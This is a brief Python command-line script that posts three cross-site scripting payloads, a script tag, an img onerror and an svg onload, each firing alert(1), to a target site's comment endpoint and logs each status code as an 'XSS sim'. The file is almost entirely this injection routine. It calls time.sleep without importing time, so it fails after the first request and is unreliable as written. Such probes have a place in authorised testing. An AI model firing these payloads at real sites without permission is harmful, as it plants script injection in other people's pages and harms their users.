#!/usr/bin/env python3

# written by Jake Power

import argparse
import requests
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>"
]

def run(base_url, endpoint="/comment", delay=0.4):
    url = base_url.rstrip("/") + endpoint
    for p in XSS_PAYLOADS:
        r = requests.post(url, data={"text": p}, timeout=5)
        print(f"[XSS sim] Posted text={p!r} -> {r.status_code}")
        time.sleep(delay)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--endpoint", default="/comment")
    args = ap.parse_args()
    run(args.base_url, args.endpoint)
